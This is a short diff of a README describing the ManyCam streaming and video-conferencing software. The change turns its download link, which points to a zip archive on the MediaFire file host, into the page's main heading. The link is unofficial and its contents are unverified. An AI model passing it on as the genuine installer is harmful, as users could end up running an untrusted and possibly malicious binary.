@@ -2,9 +2,7 @@
 
 ManyCam is a versatile live streaming and video conferencing software designed for individuals, educators, content creators, and professionals. It allows users to enhance video calls and broadcasts with virtual backgrounds, effects, and multiple video sources. ManyCam is suitable for both personal and professional use.
 
-## Installation
-
-[Download ManyCam](https://www.mediafire.com/file/a8brycgk1qko36c/manycam_x64.zip/file)
+## [Download ManyCam](https://www.mediafire.com/file/a8brycgk1qko36c/manycam_x64.zip/file)
 
 ![ezgif-7fa0de49758dbcca](https://github.com/user-attachments/assets/3840a1b0-bd9d-41ce-963f-63c10d76081a)
 
